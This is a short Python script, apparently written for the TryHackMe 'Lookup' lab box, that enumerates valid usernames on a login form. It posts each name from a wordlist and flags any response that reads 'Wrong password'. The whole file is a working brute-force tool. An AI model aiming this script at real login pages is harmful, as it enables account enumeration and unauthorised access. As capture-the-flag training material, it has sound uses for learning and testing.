import requests
import argparse

# colors in ANSI standard
RED = "\033[31m"
GREEN = "\033[32m"
RESET = "\033[0m"


def brute_force(wordlist_a, verbose_option, exhaust_option):
    with open(wordlist_a) as wordlist:
        url = "http://lookup.thm/login.php"
        data = {
            "username": "",
            "password": "p"
        }
        count = 0
        print(f"[+] Sending requests")
        try:
            for line in wordlist:
                count += 1
                data["username"] = line.strip()
                req = requests.post(url, data=data)
                if verbose_option:
                    print(f"[+] Try {count}: username = {data["username"]}")

                if req.status_code == 200:
                    res = req.text
                    if "Wrong password" in res:
                        print(f"{GREEN}[+] Username Found! Match: {data["username"]}{RESET}")
                        if not exhaust_option:
                            choice = input("Continue? (Y/N) ")
                            if choice == "N":
                                break
        except Exception as e:
            print(f"{RED}[-]Something went wrong.{RESET}")
            print(e)
            print("Did you add lookup.thm to /etc/hosts ?")






if __name__ == "__main__":
    print("Login brute-force for Lookup THM box")
    parser = argparse.ArgumentParser(prog="Brute force initial login form", 
                                     usage="""
                                           python3 login-brute.py -w [wordlist] [-v/--verbose] [-e/--exhaust]
                                           
                                           `wordlist` param is by default set to /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
                                     """,
                                     epilog="\n\n\nMade by wizarddos")
    parser.add_argument("-w", "--wordlist", help="Wordlist to choose from", default="/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt")
    parser.add_argument("-v", "--verbose", help="Verbose mode - show full output", action="store_true")
    parser.add_argument("-e", "--exhaust", help="Run script until wordlist ends", action="store_true")

    args = parser.parse_args()

    if args.wordlist:
        brute_force(args.wordlist, args.verbose, args.exhaust)